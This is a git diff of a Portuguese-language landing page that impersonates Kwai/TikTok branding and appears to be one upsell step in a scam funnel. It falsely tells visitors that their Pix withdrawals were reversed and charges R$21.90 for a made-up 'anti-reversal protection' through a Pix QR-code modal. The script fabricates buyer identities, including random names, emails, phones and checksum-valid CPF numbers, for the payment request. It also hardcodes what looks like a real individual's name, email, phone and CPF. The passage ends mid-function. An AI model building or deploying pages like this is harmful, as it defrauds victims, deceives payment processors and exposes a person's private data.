@@ -1,283 +1,1038 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Oferta Exclusiva - Avaliador Kwai</title>
-    <!-- TikTok Pixel Code Start -->
-    <script>
-      window.tikTokPixelId = "6940cb80540addb695fac48e";
-      var a = document.createElement("script");
-      a.setAttribute("async", "");
-      a.setAttribute("defer", "");
-      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
-      document.head.appendChild(a);
-    </script>
-    <!-- TikTok Pixel Code End -->
-    <style>
-      :root {
-        --kwai-orange: #FE4908;
-        --kwai-dark: #181212ff;
-        --kwai-light: #fff5ef;
-        --kwai-yellow: #ffd600;
-        --kwai-red: #ff3d00;
-      }
 
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans",
-          "Helvetica Neue", sans-serif;
-      }
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Oferta Exclusiva - Avaliador Kwai</title>
+  <!-- TikTok Pixel Code Start -->
+  <script>
+    window.tikTokPixelId = "6940cb80540addb695fac48e";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+    document.head.appendChild(a);
+  </script>
+  <!-- TikTok Pixel Code End -->
+  <style>
+    :root {
+      --kwai-orange: #FE4908;
+      --kwai-dark: #181212ff;
+      --kwai-light: #fff5ef;
+      --kwai-yellow: #ffd600;
+      --kwai-red: #ff3d00;
+    }
 
-      body {
-        background-color: var(--kwai-light);
-        color: var(--kwai-dark);
-        line-height: 1.6;
-      }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans",
+        "Helvetica Neue", sans-serif;
+    }
 
-      .container {
-        max-width: 100%;
-        width: 100%;
-        padding: 15px;
-        margin: 0 auto;
-      }
+    body {
+      background-color: var(--kwai-light);
+      color: var(--kwai-dark);
+      line-height: 1.6;
+    }
 
-      .kwai-header {
-        background: linear-gradient(135deg, var(--kwai-orange), #FE4908);
+    .container {
+      max-width: 100%;
+      width: 100%;
+      padding: 15px;
+      margin: 0 auto;
+    }
 
-        padding: 15px 0;
-        text-align: center;
-        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-        position: relative;
-      }
+    .kwai-header {
+      background: linear-gradient(135deg, var(--kwai-orange), #FE4908);
 
-      .kwai-logo {
-        height: 40px;
-        margin-bottom: 10px;
-      }
+      padding: 15px 0;
+      text-align: center;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      position: relative;
+    }
 
-      .offer-container {
-        background: white;
-        border-radius: 12px;
-        padding: 20px;
-        margin: 20px auto;
-        box-shadow: 0 5px 15px rgba(255, 107, 0, 0.1);
-        border: 1px solid rgba(255, 107, 0, 0.2);
-        max-width: 500px;
-      }
+    .kwai-logo {
+      height: 40px;
+      margin-bottom: 10px;
+    }
 
+    .offer-container {
+      background: white;
+      border-radius: 12px;
+      padding: 20px;
+      margin: 20px auto;
+      box-shadow: 0 5px 15px rgba(255, 107, 0, 0.1);
+      border: 1px solid rgba(255, 107, 0, 0.2);
+      max-width: 500px;
+    }
+
+    .offer-title {
+      color: var(--kwai-orange);
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+
+    .offer-icon {
+      font-size: 30px;
+      text-align: center;
+      margin-bottom: 15px;
+    }
+
+    .offer-description {
+      margin-bottom: 20px;
+      font-size: 16px;
+    }
+
+    .highlight {
+      background-color: rgba(255, 107, 0, 0.1);
+      padding: 10px;
+      border-radius: 8px;
+      margin: 15px 0;
+      border-left: 3px solid var(--kwai-orange);
+    }
+
+    .price-tag {
+      background-color: var(--kwai-orange);
+      color: white;
+      padding: 8px 15px;
+      border-radius: 20px;
+      font-weight: bold;
+      display: inline-block;
+      margin: 10px 0;
+    }
+
+    .cta-button {
+      background: linear-gradient(to right, var(--kwai-orange), #FE4908);
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 30px;
+      width: 100%;
+      cursor: pointer;
+      margin: 20px 0;
+      box-shadow: 0 4px 10px rgba(255, 107, 0, 0.3);
+      transition: all 0.3s ease;
+      text-align: center;
+      display: block;
+      text-decoration: none;
+    }
+
+    .cta-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 15px rgba(255, 107, 0, 0.4);
+    }
+
+    .cta-button:active {
+      transform: translateY(0);
+    }
+
+    .benefits-list {
+      list-style-type: none;
+      margin: 15px 0;
+    }
+
+    .benefits-list li {
+      padding: 8px 0;
+      padding-left: 30px;
+      position: relative;
+    }
+
+    .benefits-list li:before {
+      content: "✓";
+      color: var(--kwai-orange);
+      font-weight: bold;
+      position: absolute;
+      left: 0;
+    }
+
+    .timer {
+      background-color: var(--kwai-red);
+      color: white;
+      padding: 10px;
+      border-radius: 8px;
+      text-align: center;
+      font-weight: bold;
+      margin: 15px 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .timer-icon {
+      margin-right: 10px;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      margin-top: 30px;
+      padding: 15px;
+    }
+
+    @media (max-width: 480px) {
       .offer-title {
-        color: var(--kwai-orange);
-        font-size: 22px;
-        font-weight: 700;
-        margin-bottom: 15px;
-        text-align: center;
-      }
-
-      .offer-icon {
-        font-size: 30px;
-        text-align: center;
-        margin-bottom: 15px;
+        font-size: 20px;
       }
 
       .offer-description {
-        margin-bottom: 20px;
-        font-size: 16px;
-      }
-
-      .highlight {
-        background-color: rgba(255, 107, 0, 0.1);
-        padding: 10px;
-        border-radius: 8px;
-        margin: 15px 0;
-        border-left: 3px solid var(--kwai-orange);
-      }
-
-      .price-tag {
-        background-color: var(--kwai-orange);
-        color: white;
-        padding: 8px 15px;
-        border-radius: 20px;
-        font-weight: bold;
-        display: inline-block;
-        margin: 10px 0;
+        font-size: 15px;
       }
 
       .cta-button {
-        background: linear-gradient(to right, var(--kwai-orange), #FE4908);
-        color: white;
-        border: none;
-        padding: 15px 30px;
-        font-size: 18px;
-        font-weight: bold;
-        border-radius: 30px;
-        width: 100%;
-        cursor: pointer;
-        margin: 20px 0;
-        box-shadow: 0 4px 10px rgba(255, 107, 0, 0.3);
-        transition: all 0.3s ease;
-        text-align: center;
-        display: block;
-        text-decoration: none;
+        padding: 12px 20px;
+        font-size: 16px;
+      }
+    }
+
+    /* Modal PIX Styles */
+    .pix-modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 10005;
+      background: rgba(0, 0, 0, 0.6);
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .pix-modal-overlay.active {
+      display: flex;
+    }
+
+    .pix-modal-container {
+      position: relative;
+      z-index: 10006;
+      max-width: 500px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+      padding: 30px;
+      box-sizing: border-box;
+      max-height: 90vh;
+      overflow-y: auto;
+      animation: slideUpModal 0.3s ease;
+    }
+
+    @keyframes slideUpModal {
+      from {
+        transform: translateY(50px);
+        opacity: 0;
       }
 
-      .cta-button:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 6px 15px rgba(255, 107, 0, 0.4);
-      }
-
-      .cta-button:active {
+      to {
         transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .pix-modal-close {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      background: transparent;
+      border: none;
+      font-size: 28px;
+      cursor: pointer;
+      color: #747378;
+      width: 36px;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      transition: background-color 0.15s ease;
+      z-index: 10;
+    }
+
+    .pix-modal-close:hover {
+      background-color: #f5f5f5;
+      color: #000;
+    }
+
+    .pix-loading {
+      text-align: center;
+      padding: 40px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .pix-spinner {
+      width: 40px;
+      height: 40px;
+      border: 3px solid #e0e0e0;
+      border-radius: 50%;
+      border-top-color: #003772;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .pix-payment-content {
+      display: none;
+    }
+
+    .pix-section-title {
+      font-size: 16px;
+      margin-bottom: 20px;
+      color: #000;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      text-align: center;
+    }
+
+    .pix-qrcode-container {
+      text-align: center;
+      margin: 24px 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    #pix-modal-qrcode {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      background: #fff;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      margin: 0 auto;
+    }
+
+    #pix-modal-qrcode-img {
+      max-width: 200px;
+      height: auto;
+      border-radius: 8px;
+      display: none;
+    }
+
+    .pix-copy-section {
+      margin-top: 24px;
+    }
+
+    .pix-input-group {
+      display: flex;
+      margin-bottom: 16px;
+      gap: 0;
+      width: 100%;
+    }
+
+    #pix-modal-code {
+      flex: 1;
+      padding: 12px 16px;
+      border: 1px solid #e0e0e0;
+      border-right: none;
+      border-radius: 8px 0 0 8px;
+      font-size: 13px;
+      background: #fff;
+      color: #000;
+      font-family: "Roboto Mono", monospace;
+      height: 41px;
+      box-sizing: border-box;
+    }
+
+    .pix-copy-btn {
+      background: #003772;
+      color: white;
+      border: 1px solid #003772;
+      border-left: none;
+      padding: 0 20px;
+      border-radius: 0 8px 8px 0;
+      cursor: pointer;
+      font-weight: 500;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      height: 41px;
+    }
+
+    .pix-copy-btn.copied {
+      background: #10b981;
+      border-color: #10b981;
+    }
+
+    .pix-payment-info {
+      margin-top: 24px;
+      padding: 16px;
+      background: #f5f5f5;
+      border-radius: 8px;
+    }
+
+    .pix-info-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+
+    .pix-payment-status {
+      margin-top: 20px;
+      padding: 12px;
+      background: #f5f5f5;
+      border-radius: 8px;
+      border-left: 3px solid #007bff;
+      display: none;
+    }
+
+    .pix-status-content {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .pix-status-icon {
+      font-size: 20px;
+      color: #007bff;
+    }
+
+    .pix-error-message {
+      color: #dc2626;
+      text-align: center;
+      padding: 16px;
+      background: #fff5f5;
+      border-radius: 8px;
+      margin-top: 16px;
+      border: 1px solid #fecaca;
+      display: none;
+      font-size: 14px;
+    }
+
+    @media (max-width: 767px) {
+      .pix-modal-container {
+        padding: 20px;
+        max-height: 95vh;
       }
 
-      .benefits-list {
-        list-style-type: none;
-        margin: 15px 0;
+      .pix-input-group {
+        flex-direction: column;
+        gap: 8px;
       }
 
-      .benefits-list li {
-        padding: 8px 0;
-        padding-left: 30px;
-        position: relative;
-      }
-
-      .benefits-list li:before {
-        content: "✓";
-        color: var(--kwai-orange);
-        font-weight: bold;
-        position: absolute;
-        left: 0;
-      }
-
-      .timer {
-        background-color: var(--kwai-red);
-        color: white;
-        padding: 10px;
+      #pix-modal-code {
         border-radius: 8px;
-        text-align: center;
-        font-weight: bold;
-        margin: 15px 0;
-        display: flex;
+        border: 1px solid #e0e0e0;
+        width: 100%;
+      }
+
+      .pix-copy-btn {
+        border-radius: 8px;
+        border: 1px solid #003772;
+        padding: 12px;
         justify-content: center;
-        align-items: center;
+        width: 100%;
       }
+    }
+  </style>
+</head>
 
-      .timer-icon {
-        margin-right: 10px;
-      }
+<body>
+  <div class="kwai-header">
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 42" width="118" height="42">
+      <path fill="#25F4EE"
+        d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z">
+      </path>
+      <path fill="#25F4EE"
+        d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z">
+      </path>
+      <path fill="#FE4908"
+        d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z">
+      </path>
+      <path fill="#FE4908"
+        d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z">
+      </path>
+      <path fill="black"
+        d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714zM30.048 13.179h14.774l-1.354 4.232h-3.832v15.644h-4.778V17.41l-4.804.006-.006-4.238zM69.032 13.179h15.12l-1.355 4.232h-4.17v15.644h-4.785V17.41l-4.804.006-.006-4.238zM45.73 19.502h4.733v13.553h-4.708l-.026-13.553zM52.347 13.128h4.733v9.257l4.689-4.61h5.646l-5.934 5.76 6.644 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236H52.34V13.128h.006zM102.49 13.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V13.128zM48.093 17.954a2.384 2.384 0 002.382-2.384 2.384 2.384 0 10-2.382 2.384z">
+      </path>
+      <path fill="#25F4EE"
+        d="M83.544 24.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z">
+      </path>
+      <path fill="#FE4908"
+        d="M92.858 16.83c-.217 0-.505.012-.716.025a8.111 8.111 0 017.468 8.087 8.112 8.112 0 01-7.468 8.087c.211.02.499.026.716.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z">
+      </path>
+      <path fill="black"
+        d="M91.58 28.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.942 3.945zm0-12.058c-4.477 0-8.106 3.631-8.106 8.113 0 4.482 3.629 8.113 8.106 8.113 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z">
+      </path>
+    </svg>
+  </div>
 
-      .footer {
-        text-align: center;
-        font-size: 12px;
-        color: #666;
-        margin-top: 30px;
-        padding: 15px;
-      }
+  <div class="container">
+    <div class="offer-container">
+      <div class="offer-icon">🔒</div>
+      <h1 class="offer-title">Ativação de Proteção Anti-Reversão Pix</h1>
 
-      @media (max-width: 480px) {
-        .offer-title {
-          font-size: 20px;
-        }
-
-        .offer-description {
-          font-size: 15px;
-        }
-
-        .cta-button {
-          padding: 12px 20px;
-          font-size: 16px;
-        }
-      }
-    </style>
-  </head>
-  <body>
-    <div class="kwai-header">
-      <svg
-        xmlns="http://www.w3.org/2000/svg"
-        fill="none"
-        viewBox="0 0 118 42"
-        width="118"
-        height="42"
-      >
-        <path
-          fill="#25F4EE"
-          d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z"
-        ></path>
-        <path
-          fill="#25F4EE"
-          d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z"
-        ></path>
-        <path
-          fill="#FE4908"
-          d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z"
-        ></path>
-        <path
-          fill="#FE4908"
-          d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z"
-        ></path>
-        <path
-          fill="black"
-          d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714zM30.048 13.179h14.774l-1.354 4.232h-3.832v15.644h-4.778V17.41l-4.804.006-.006-4.238zM69.032 13.179h15.12l-1.355 4.232h-4.17v15.644h-4.785V17.41l-4.804.006-.006-4.238zM45.73 19.502h4.733v13.553h-4.708l-.026-13.553zM52.347 13.128h4.733v9.257l4.689-4.61h5.646l-5.934 5.76 6.644 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236H52.34V13.128h.006zM102.49 13.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V13.128zM48.093 17.954a2.384 2.384 0 002.382-2.384 2.384 2.384 0 10-2.382 2.384z"
-        ></path>
-        <path
-          fill="#25F4EE"
-          d="M83.544 24.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"
-        ></path>
-        <path
-          fill="#FE4908"
-          d="M92.858 16.83c-.217 0-.505.012-.716.025a8.111 8.111 0 017.468 8.087 8.112 8.112 0 01-7.468 8.087c.211.02.499.026.716.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"
-        ></path>
-        <path
-          fill="black"
-          d="M91.58 28.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.942 3.945zm0-12.058c-4.477 0-8.106 3.631-8.106 8.113 0 4.482 3.629 8.113 8.106 8.113 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"
-        ></path>
-      </svg>
-    </div>
-
-    <div class="container">
-      <div class="offer-container">
-        <div class="offer-icon">🔒</div>
-        <h1 class="offer-title">Ativação de Proteção Anti-Reversão Pix</h1>
-
-        <div class="offer-description">
-          <div class="highlight" style="border-left-color: var(--kwai-red)">
-            <p>
-              ⚠️ <strong>Atenção:</strong> Saques recentes foram revertidos por
-              falha bancária e divergência de chave Pix.
-            </p>
-          </div>
-
+      <div class="offer-description">
+        <div class="highlight" style="border-left-color: var(--kwai-red)">
           <p>
-            Ative agora a proteção anti-reversão e garanta que o valor seja
-            entregue corretamente na sua conta.
+            ⚠️ <strong>Atenção:</strong> Saques recentes foram revertidos por
+            falha bancária e divergência de chave Pix.
           </p>
-
-          <ul class="benefits-list">
-            <li>Cobertura contra reversão automática</li>
-            <li>Proteção contra erro de chave</li>
-            <li>Prevenção de falhas bancárias</li>
-          </ul>
         </div>
 
-        <button onclick="redirectToPayment()" class="cta-button">
-          ✅ CONCLUIR COM SEGURANÇA
-        </button>
+        <p>
+          Ative agora a proteção anti-reversão e garanta que o valor seja
+          entregue corretamente na sua conta.
+        </p>
+
+        <ul class="benefits-list">
+          <li>Cobertura contra reversão automática</li>
+          <li>Proteção contra erro de chave</li>
+          <li>Prevenção de falhas bancárias</li>
+        </ul>
       </div>
-    </div>
 
-    <div class="footer">
-      © 2025 TikTok Brasil - Todos os direitos reservados
+      <button onclick="abrirModalPix()" class="cta-button">
+        ✅ CONCLUIR COM SEGURANÇA
+      </button>
     </div>
+  </div>
 
-    <script>
-      function redirectToPayment() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const queryString = urlParams.toString();
-        window.location.href =
-          "pagamento/index.html" + (queryString ? "?" + queryString : "");
+  <div class="footer">
+    © 2025 TikTok Brasil - Todos os direitos reservados
+  </div>
+
+  <!-- Recursos para PIX -->
+  <script src="pagamento/js/qrcode.min.js"></script>
+  <script src="../pagamento/payment-api.js"></script>
+
+  <!-- Modal PIX -->
+  <div id="pix-modal-overlay" class="pix-modal-overlay">
+    <div class="pix-modal-container">
+      <button class="pix-modal-close" onclick="fecharModalPix()">
+        &times;
+      </button>
+
+      <div style="text-align: center; margin-bottom: 20px; font-size: 20px; font-weight: 600; color: #000;">
+        Pagamento via PIX
+      </div>
+
+      <div id="pix-loading" class="pix-loading">
+        <div class="pix-spinner"></div>
+        <p>Gerando QRCode para pagamento...</p>
+      </div>
+
+      <div id="pix-payment-content" class="pix-payment-content">
+        <div class="pix-qrcode-container">
+          <h2 class="pix-section-title">Escaneie o QRCode abaixo</h2>
+          <div id="pix-modal-qrcode"></div>
+          <img id="pix-modal-qrcode-img" alt="QR Code PIX" />
+        </div>
+
+        <div class="pix-copy-section">
+          <h2 class="pix-section-title" style="font-size: 14px; margin-bottom: 12px">
+            Ou copie o código PIX
+          </h2>
+          <div class="pix-input-group">
+            <input type="text" id="pix-modal-code" readonly />
+            <button class="pix-copy-btn" id="pix-copy-btn">
+              <i class="far fa-copy"></i>
+              <span>Copiar</span>
+            </button>
+          </div>
+        </div>
+
+        <div class="pix-payment-info">
+          <div class="pix-info-item">
+            <span class="pix-info-label"> Valor: </span>
+            <span id="pix-amount">R$ 0,00</span>
+          </div>
+          <div class="pix-info-item">
+            <span class="pix-info-label"> Válido até: </span>
+            <span id="pix-expiration">--/--/---- --:--</span>
+          </div>
+        </div>
+
+        <div id="pix-payment-status" class="pix-payment-status">
+          <div class="pix-status-content">
+            <div class="pix-status-icon">
+              <i class="fas fa-spinner fa-spin"></i>
+            </div>
+            <div class="pix-status-text">
+              <p class="pix-status-title">
+                Aguardando confirmação do pagamento...
+              </p>
+              <p class="pix-status-subtitle" id="pix-status-subtitle">
+                Verificando a cada 8 segundos
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div id="pix-error-message" class="pix-error-message"></div>
+    </div>
+  </div>
+
+  <script>
+    // --- Lógica do Modal PIX (Upsell 6) ---
+
+    // Variáveis globais
+    let pixTransactionId = null;
+    let pixPaymentId = null;
+    let pixCheckPaymentInterval = null;
+    let pixPollingDiretoCleanup = null;
+    let paymentConfirmed = false;
+
+    const DEFAULT_CUSTOMER = {
+      email: "fabioonofre81@gmail.com",
+      phone: "84996733457",
+      name: "Fábio Onofre de Oliveira",
+      document: "08993537461",
+    };
+
+    // Configuração específica do Upsell 6
+    function getVariantPrice() {
+      return 21.90;
+    }
+
+    const CONTENT_ID = "tiktokpay_upsell6";
+    const REDIRECT_URL = "../upsell7/index.html";
+
+    function abrirModalPix() {
+      const modal = document.getElementById("pix-modal-overlay");
+      modal.classList.add("active");
+      document.body.style.overflow = "hidden";
+
+      const pixLoading = document.getElementById("pix-loading");
+      const pixPaymentContent = document.getElementById("pix-payment-content");
+      const pixErrorMessage = document.getElementById("pix-error-message");
+      const pixPaymentStatus = document.getElementById("pix-payment-status");
+
+      pixLoading.style.display = "flex";
+      pixPaymentContent.style.display = "none";
+      pixErrorMessage.style.display = "none";
+      pixPaymentStatus.style.display = "none";
+
+      tryGeneratePix();
+    }
+
+    function fecharModalPix() {
+      const modal = document.getElementById("pix-modal-overlay");
+      modal.classList.remove("active");
+      document.body.style.overflow = "";
+
+      if (pixCheckPaymentInterval) {
+        clearInterval(pixCheckPaymentInterval);
+        pixCheckPaymentInterval = null;
       }
-    </script>
-  </body>
+      if (pixPollingDiretoCleanup) {
+        pixPollingDiretoCleanup();
+        pixPollingDiretoCleanup = null;
+      }
+      paymentConfirmed = false;
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const overlay = document.getElementById("pix-modal-overlay");
+      if (overlay) {
+        overlay.addEventListener("click", function (e) {
+          if (e.target === overlay) {
+            fecharModalPix();
+          }
+        });
+      }
+
+      // Salvar UTMs no load
+      getUtmParams();
+    });
+
+    function getUtmParams() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const utmParams = {};
+      const utmFields = ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content", "click_id", "fbclid", "gclid", "msclkid", "ttclid"];
+
+      utmFields.forEach((param) => {
+        if (urlParams.has(param)) {
+          utmParams[param] = urlParams.get(param);
+        }
+      });
+
+      if (Object.keys(utmParams).length > 0) {
+        try {
+          localStorage.setItem("utm_params", JSON.stringify(utmParams));
+        } catch (e) { console.warn("Erro localStorage UTM:", e); }
+      }
+      return utmParams;
+    }
+
+    function gerarCPF() {
+      let cpf = "";
+      for (let i = 0; i < 9; i++) cpf += Math.floor(Math.random() * 10);
+      let soma = 0;
+      for (let i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i)) * (10 - i);
+      let resto = 11 - (soma % 11);
+      let dv1 = resto > 9 ? 0 : resto;
+      cpf += dv1;
+      soma = 0;
+      for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
+      resto = 11 - (soma % 11);
+      let dv2 = resto > 9 ? 0 : resto;
+      cpf += dv2;
+      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+    }
+
+    function gerarNome() {
+      const nomes = ["Joao", "Maria", "Pedro", "Ana", "Carlos", "Mariana", "Lucas", "Juliana", "Fernando", "Patricia"];
+      const sobrenomes = ["Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Alves", "Pereira", "Gomes", "Martins"];
+      const nome = nomes[Math.floor(Math.random() * nomes.length)];
+      const sobrenome1 = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
+      const sobrenome2 = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
+      return `${nome} ${sobrenome1} ${sobrenome2}`;
+    }
+
+    function gerarEmail(nome) {
+      const provedores = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com.br", "icloud.com"];
+      const nomeFormatado = nome.toLowerCase().replace(/\s+/g, ".");
+      const provedor = provedores[Math.floor(Math.random() * provedores.length)];
+      return `${nomeFormatado}@${provedor}`;
+    }
+
+    function gerarTelefone() {
+      const ddd = ["11", "21", "31", "41", "51", "61", "71", "81", "91"];
+      const num = Math.floor(10000000 + Math.random() * 90000000);
+      return `${ddd[Math.floor(Math.random() * ddd.length)]}9${num.toString().substring(1)}`;
+    }
+
+    function getClienteData() {
+      let clienteNome = null;
+      let clienteEmail = null;
+      let clienteDocumento = null;
+      try {
+        const storedData = localStorage.getItem("userPixData");
+        if (storedData) {
+          const formData = JSON.parse(storedData);
+          clienteNome = formData.nome || null;
+          if (formData.tipoChave === "CPF" && formData.chavePix) {
+            clienteDocumento = formData.chavePix.replace(/\D/g, "");
+          }
+        }
+      } catch (e) { console.error(e); }
+
+      if (!clienteNome) clienteNome = gerarNome();
+      if (!clienteEmail) clienteEmail = gerarEmail(clienteNome);
+      if (!clienteDocumento) clienteDocumento = gerarCPF().replace(/\D/g, "");
+      const clienteTelefone = gerarTelefone();
+
+      return { nome: clienteNome, email: clienteEmail, documento: clienteDocumento, telefone: clienteTelefone };
+    }
+
+    function verificarPagamento(idTransacao) {
+      if (typeof window.verifyPayment === "function") {
+        return window.verifyPayment(idTransacao, pixPaymentId);
+      }
+      return fetch("/api/verifyPayment", {
+        method: "POST",
